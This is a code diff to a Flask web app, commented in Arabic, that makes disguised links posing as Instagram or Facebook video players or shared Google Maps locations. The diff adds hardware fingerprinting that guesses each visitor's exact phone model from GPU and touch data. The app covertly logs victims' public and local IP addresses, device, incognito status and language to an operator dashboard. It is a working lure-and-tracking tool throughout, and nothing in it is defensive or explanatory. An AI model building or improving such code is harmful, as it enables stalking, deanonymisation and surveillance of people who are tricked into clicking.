@@ -32,6 +32,7 @@ def init_db():
                 target_platform TEXT
             )
         ''')
+        # تم إضافة حقل device_model لتخزين الاسم الدقيق والمستنتج للهاتف
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS clicks (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -39,6 +40,7 @@ def init_db():
                 ip TEXT,
                 local_ip TEXT,
                 device TEXT,
+                device_model TEXT,
                 time TEXT,
                 language TEXT,
                 screen_size TEXT,
@@ -53,12 +55,39 @@ def init_db():
 
 init_db()
 
+# قاعدة بيانات مصغرة ومتقدمة داخل السيرفر للمطابقة والتحقق المتقاطع (Hardware Fingerprinting)
+def guess_device_by_hardware(ua_string, gpu, touch_points):
+    gpu_upper = gpu.upper()
+    ua_upper = ua_string.upper()
+    
+    # التحقق أولاً إذا كان آيفون/آيباد (iOS) ويحاول الاختباء في المتصفح الافتراضي
+    if "IPHONE" in ua_upper or "MACINTOSH" in ua_upper:
+        if "APPLE" in gpu_upper or "METAL" in gpu_upper:
+            if "5" in str(touch_points): return "Apple iPhone (Advanced iOS Client)"
+            return "Apple Device (iPad/Mac)"
+
+    # التحقق من هواتف الأندرويد بناءً على المعالجات الرسومية الشهيرة
+    if "MALI-G710" in gpu_upper:
+        return "Android Flagship (e.g., Redmi Note 12 Pro / Galaxy A54 فئة متوسطة عليا)"
+    elif "MALI-G57" in gpu_upper:
+        return "Android Device (e.g., Realme C11 / Infinix / Tecno فئة اقتصادية)"
+    elif "ADRENO (TM) 610" in gpu_upper or "ADRENO 610" in gpu_upper:
+        return "Android Device (e.g., Xiaomi Redmi 9 / Oppo A53)"
+    elif "ADRENO (TM) 730" in gpu_upper or "ADRENO 730" in gpu_upper:
+        return "Android Premium Flagship (e.g., Samsung S22 Ultra / Xiaomi 12 Pro)"
+    elif "POWERVR" in gpu_upper or "GE8320" in gpu_upper:
+        return "Android Device (e.g., Samsung A03s / Realme C21 الفئة الاقتصادية)"
+        
+    if "ANDROID" in ua_upper:
+        return "Generic Android Smartphone"
+        
+    return "Unknown Hardware Client"
+
 def fetch_original_meta(url, manual_thumb_url=None):
     url_lower = url.lower()
     title = "Watch Trending Video Content in HD Quality"
     img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
     
-    # إذا قام المستخدم بإدخال الرابط يدوياً وهو الأفضل الآن لـ Meta
     if manual_thumb_url and manual_thumb_url.strip():
         if "instagram.com" in url_lower:
             title = "Instagram Post Media Player"
@@ -66,7 +95,6 @@ def fetch_original_meta(url, manual_thumb_url=None):
             title = "Facebook Video Player HD"
         return title, manual_thumb_url.strip()
         
-    # الجلب التلقائي للمواقع المفتوحة والمستقرة فقط (يوتيوب وتيك توك وخرائط جوجل)
     if "goo.gl/maps" in url_lower or "maps.google" in url_lower:
         title = "Google Maps - Realtime Location Shared"
         img = "https://images.unsplash.com/photo-1524661135-423995f22d0b?w=600"
@@ -160,7 +188,7 @@ DASHBOARD_LAYOUT = '''
                     <a id="extractor_link" href="#" target="_blank" class="helper-btn">🔗 اضغط هنا لاستخراج رابط الصورة</a>
                     
                     <label style="margin-top:10px;">قم بلصق رابط الصورة المستخرجة هنا (Image URL):</label>
-                    <input type="url" name="manual_thumbnail" id="manual_thumbnail" placeholder="https://..." value="">
+                    <input type="url" name="manual_thumbnail" id="manual_thumbnail" placeholder="https://...">
                 </div>
 
                 <label>Admin Description / Note:</label>
@@ -286,6 +314,7 @@ ANALYTICS_LAYOUT = '''
         .log-table td:first-child { font-weight: bold; color: #4b5563; width: 30%; }
         .log-table td:last-child { color: #111827; font-family: monospace; word-break: break-all; }
         .badge-danger { background-color: #ef4444; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
+        .badge-device { background-color: #1e3a8a; color: white; padding: 4px 10px; border-radius: 6px; font-weight: bold; font-size: 13px; }
     </style>
 </head>
 <body>
@@ -311,6 +340,7 @@ ANALYTICS_LAYOUT = '''
                 <div class="log-header">Log Session Block #{{ click.id }} - Captured at {{ click.time }}</div>
                 <table class="log-table">
                     <tr><td>Date/Time</td><td>{{ click.time }} UTC+1 (Algerian Standard)</td></tr>
+                    <tr><td>Detected Phone Model</td><td><span class="badge-device">{{ click.device_model }}</span></td></tr>
                     <tr><td>IP Address</td><td><span class="badge-danger">{{ click.ip }}</span></td></tr>
                     <tr><td>Local IP (LAN)</td><td style="color:#15803d; font-weight:bold;">{{ click.local_ip }}</td></tr>
                     <tr><td>Language</td><td>{{ click.language }}</td></tr>
@@ -319,7 +349,7 @@ ANALYTICS_LAYOUT = '''
                     <tr><td>GPU Render Engine</td><td>{{ click.gpu }}</td></tr>
                     <tr><td>Touch Screen Hardware</td><td>{{ click.touch_points }}</td></tr>
                     <tr><td>Referring URL</td><td style="color:#2563eb;">{{ click.referrer }}</td></tr>
-                    <tr><td>User Agent Details</td><td style="font-size:11px; color:#4b5563;">{{ click.device }}</td></tr>
+                    <tr><td>Raw User Agent</td><td style="font-size:11px; color:#4b5563;">{{ click.device }}</td></tr>
                 </table>
             </div>
             {% endfor %}
@@ -342,7 +372,7 @@ def my_links():
         cursor = conn.cursor()
         cursor.execute('''
             SELECT l.id, l.original_url, l.note, l.video_title, l.custom_image, l.target_platform, COUNT(c.id) as clicks_count 
-            FROM links l LEFT JOIN clicks c ON l.id = c.link_id GROUP BY l.id ORDER BY l.id DESC
+            FROM links l LEFT JOIN clicks  c ON l.id = c.link_id GROUP BY l.id ORDER BY l.id DESC
         ''')
         links_list = cursor.fetchall()
     return render_template_string(MY_LINKS_LAYOUT, links_list=links_list)
@@ -443,7 +473,7 @@ def secure_redirect(link_id):
                     }};
 
                     if(navigator.maxTouchPoints && navigator.maxTouchPoints > 0){{
-                        payload.touch_points = "Yes (" + navigator.maxTouchPoints + " touch points)";
+                        payload.touch_points = navigator.maxTouchPoints;
                     }}
 
                     try {{
@@ -509,32 +539,45 @@ def log_click(link_id):
         ip_address = ip_address.split(',')[0].strip()
         
     ua_string = request.headers.get('User-Agent', '')
+    gpu_info = data.get('gpu', 'Unknown')
+    touch_pts = data.get('touch_points', '0')
     
+    # تفكيك وفحص نوع الموديل بأقصى دقة ممكنة
+    device_model_final = "Unknown Client Hardware"
     try:
         user_agent = parse(ua_string)
-        parsed_device = f"Mobile: {user_agent.device.brand or ''} {user_agent.device.model or 'Smartphone'} ({user_agent.os.family} {user_agent.os.version_string})"
-    except:
-        parsed_device = "Unknown Native Client"
+        brand = user_agent.device.brand
+        model = user_agent.device.model
+        
+        # 1. إذا كان المتصفح يرسل الاسم الصريح والمفتوح (مثل تطبيقات فيسبوك)
+        if brand and model and brand.lower() != "generic" and model.lower() != "smartphone":
+            device_model_final = f"{brand} {model}"
+        else:
+            # 2. خط الدفاع الثاني: إذا كان المتصفح مقيداً (حرف K) نقوم بالمطابقة المادية الرسومية
+            device_model_final = guess_device_by_hardware(ua_string, gpu_info, touch_pts)
+            
+    except Exception as e:
+        pass
 
-    device_final_data = f"{parsed_device} || UA: {ua_string}"
     current_time = get_gmt1_time()
     
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
         cursor.execute('''
-            INSERT INTO clicks (link_id, ip, local_ip, device, time, language, screen_size, gpu, incognito, touch_points, referrer) 
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            INSERT INTO clicks (link_id, ip, local_ip, device, device_model, time, language, screen_size, gpu, incognito, touch_points, referrer) 
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         ''', (
             link_id, 
             ip_address, 
             data.get('local_ip', 'Encrypted (mDNS)'), 
-            device_final_data, 
+            ua_string, 
+            device_model_final, # حفظ اسم الهاتف بدقة هنا
             current_time,
             data.get('language', 'fr-FR'),
             data.get('screen_size', 'Unknown'),
-            data.get('gpu', 'Unknown'),
+            gpu_info,
             data.get('incognito', 'No'),
-            data.get('touch_points', 'Unknown'),
+            f"Yes ({touch_pts} touch points)" if int(str(touch_pts)) > 0 else "No (0 touch points)",
             data.get('referrer', 'Direct Visit')
         ))
         conn.commit()
